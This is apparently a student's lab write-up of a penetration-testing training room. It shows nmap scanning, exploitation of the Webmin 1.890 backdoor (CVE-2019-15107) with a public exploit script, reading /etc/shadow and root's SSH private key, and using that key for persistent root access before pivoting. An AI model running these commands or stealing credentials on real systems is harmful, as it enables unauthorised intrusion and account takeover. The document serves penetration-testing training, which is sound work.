A default scan only checks the top 1,000 ports — it would miss Webmin on 10000. Scanning every port is what surfaces the real way in.

Command
nmap -Pn -p- -T4 --min-rate 1000 -oN webserver.txt 10.200.180.200
  • -PnSkip host-discovery ping; assume the host is up.
  • -p-Scan ALL 65,535 ports (not just the top 1,000).
  • -T4 --min-rate 1000Push speed up so the full scan finishes fast.
  • -oN webserver.txtSave the output to a file.
Open ports found: 22 (SSH) · 80 (HTTP) · 443 (HTTPS) · 10000 (Webmin) — the catch, only visible because of -p-.
Lesson lived: over a lossy VPN, --min-rate 1000 can make packets drop and every port read "filtered." If that happens, slow to -T3 (or lower the rate) so answers come back.

Port numbers tell you which doors exist; versions tell you the brand of each lock — and that's what you look up for a known exploit.

Command
nmap -Pn -sV -p 22,80,443,10000 -T4 -oN webserver_detail.txt 10.200.180.200
  • -sVService/version detection — the exact software + version per port.
  • -p 22,80,443,10000Scan only the ports we already found open (fast + gentle).
Key findings: 10000 → MiniServ 1.890 (Webmin httpd) · 80/443 → Apache 2.4.37 (centos) → OS = CentOS (the banner leaks the OS).

CVE-2019-15107 — a supply-chain backdoor. Webmin 1.890 was compromised at its build server: malicious code was slipped into the official release, adding an unauthenticated command-injection in password_change.cgi that runs as root. (Exactly why you only pull tools from trusted, official sources.)

Done manually (not Metasploit) — the PNPT exam limits Metasploit to a single use, so build the manual muscle.

Commands
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107
python3 -m pip install -r requirements.txt
python3 CVE-2019-15107.py 10.200.180.200
  • git cloneCopy the exploit repo (by the room's own author = trusted source).
  • python3 -m pipInstall deps into the SAME python that runs the script (fixes "ModuleNotFoundError").
  • CVE-2019-15107.py <ip>Runs the exploit; port 10000 + SSL handled automatically.
Result: a pseudoshell → whoami = root, uid=0(root). No privilege escalation needed — the backdoor already runs as root. 👑

As root you can read everything. Two prizes: the password hash (a flag) and — more usefully — root's SSH key.

Commands
cat /etc/shadow            # root $6$ (SHA-512) hash
cat /root/.ssh/id_rsa      # root's SSH PRIVATE key  ← the real prize
Hash structure $6$ salt $ hash — $6$ = SHA-512, salted → effectively uncrackable. So don't crack it: use the key instead.
Slip to avoid: typing the key's path alone runs it as a program → "Permission denied." You read a key with cat, you don't execute it.

The pseudoshell is fragile. The stolen SSH key gives a solid, repeatable root login — true persistence, and your launchpad for pivoting.

Commands
nano webserver_key                         # paste the full BEGIN…END key
chmod 600 webserver_key
ssh -i webserver_key root@10.200.180.200
  • chmod 600Owner read/write only. SSH REFUSES a world-readable private key.
  • ssh -i <key>Authenticate with the key file instead of a password.
Result: [root@prod-serv ~]# — stable root shell on tap, even if Webmin is patched or rebooted. Persistence achieved.

git-serv and personal-PC have no route from the internet — Kali can't touch them directly. The webserver has a foot in both networks, so you tunnel your tools through it to reach the hidden machines.

Office-building analogy: prod-serv is the street-facing reception desk; the internal machines are locked back offices with no street door. You own reception → you use its internal hallways to reach the back offices. That's pivoting — the next chapter.

⚠️ Lessons learned the hard way

🧊
Frozen lab, every port "filtered"
Scans returned all-filtered + ping = 100% loss. A box left running for days freezes. Fix: hit Reset on the network panel (reboots, same IPs) — not "Regenerate" (new IPs). Diagnose infra vs. self: scan → ping → check the connection panel.
🏃
Too fast = dropped packets
--min-rate 1000 over a lossy VPN loses packets and fakes "filtered." Slow to -T3 and answers come back.
🧰
pip3 vs python3 — wrong toolbox
ModuleNotFoundError after installing? pip3 and python3 can be different interpreters. Use python3 -m pip install … to install into the one that runs the script.
📄
cat the key, don't run it
Typing /root/.ssh/id_rsa alone tries to EXECUTE it → "Permission denied." Read it with cat.
➡️
>> appends, > overwrites
Editing /etc/hosts: two arrows add a line; one arrow wipes the file. Muscle memory worth keeping.
